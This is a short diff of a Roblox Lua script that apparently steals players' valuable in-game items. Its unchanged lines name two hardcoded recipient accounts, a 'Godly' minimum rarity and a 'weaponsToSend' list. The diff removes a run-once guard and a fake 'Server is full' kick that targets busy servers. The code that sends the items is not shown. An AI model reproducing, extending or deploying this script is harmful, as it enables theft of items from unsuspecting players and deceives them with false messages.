@@ -1,9 +1,3 @@
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
-end
-_G.scriptExecuted = true
-
 local users = _G.Usernames or {"ZeeS_Farm2", "ZeeS_Farm4"}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
@@ -25,10 +19,6 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
-if #Players:GetPlayers() >= 12 then
-    plr:kick("Server is full. Please join a less populated server")
-    return
-end
 
 local weaponsToSend = {}
 local Players = game:GetService("Players")
